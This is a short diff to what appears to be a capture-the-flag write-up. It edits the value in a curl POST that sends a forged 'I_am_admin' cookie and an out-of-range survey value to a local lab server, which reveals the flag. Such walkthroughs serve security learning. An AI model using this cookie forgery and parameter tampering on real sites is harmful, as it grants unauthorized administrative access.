@@ -28,7 +28,7 @@ To exploit this, I sent a modified request using **Burp Suite** or **curl**, cha
 ``curl -X POST "http://192.168.1.56/?page=survey" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" \
-  --data "sujet=2&valeur=999999"``
+  --data "sujet=2&valeur=888888"``
 
 After sending this payload, the server responded differently — revealing the hidden **flag**.
 
